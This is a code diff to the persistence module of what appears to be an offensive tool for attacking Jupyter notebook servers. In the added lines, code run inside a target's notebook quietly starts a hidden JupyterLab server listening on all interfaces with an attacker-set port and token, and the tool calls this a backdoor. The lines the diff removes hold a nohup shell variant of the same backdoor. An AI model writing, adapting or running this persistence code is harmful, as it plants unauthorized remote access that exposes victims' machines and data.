@@ -8,11 +8,8 @@ from vger.exploit import Exploit
 
 
 class Persist:
-    def __init__(self, host_or_connection, secret=""):
-        if isinstance(host_or_connection, Connection):
-            self.connection = host_or_connection
-        else:
-            self.connection = Connection(host_or_connection, secret)
+    def __init__(self, connection: Connection):
+        self.connection = connection
 
     def persist(self):
         if self.connection.first_time_in_menu["persist"]:
@@ -81,30 +78,21 @@ class Persist:
                 port = config["port"]
                 secret = config["secret"]
         if self.connection.target:
-            loop.run_until_complete(
-                Attack(self.connection).attack_session(
-                    self.connection.target,
-                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
-                    silent=True,
-                    print_out=False,
-                )
-            )
-            self.connection.print_with_rule(f"Backdoor attempted on {port}")
-        else:
-            self.connection.print_with_rule("Target needed for backdoor")
-            if interactive and Enumerate(self.connection).pick_target():
-                self.jupyter_backdoor(port=port, secret=secret)
-            else:
-                self.connection.print_with_rule(
-                    "Attempting to spawn Jupyter from shell.\nMay fail due to missing dependencies.\nVerify success manually."
-                )
-                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
+            try:
                 loop.run_until_complete(
-                    Attack(self.connection).run_ephemeral_terminal(
-                        launch_jupyter, stdout=False
+                    Attack(self.connection).attack_session(
+                        self.connection.target,
+                        f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
+                        silent=True,
+                        print_out=False,
                     )
                 )
                 self.connection.print_with_rule(f"Backdoor attempted on {port}")
+            except Exception as e:
+                self.connection.print_with_rule(f"Error attempting backdoor via notebook: {e}", category="Error")
+        else:
+            self.connection.print_with_rule("No target notebook. Target needed for notebook-based backdoor.")
+            self.connection.print_with_rule("To attempt a shell-based backdoor, please use 'Run shell command' from Enumerate or Persist menu.", category="Info")
 
     def export_console(self):
         """
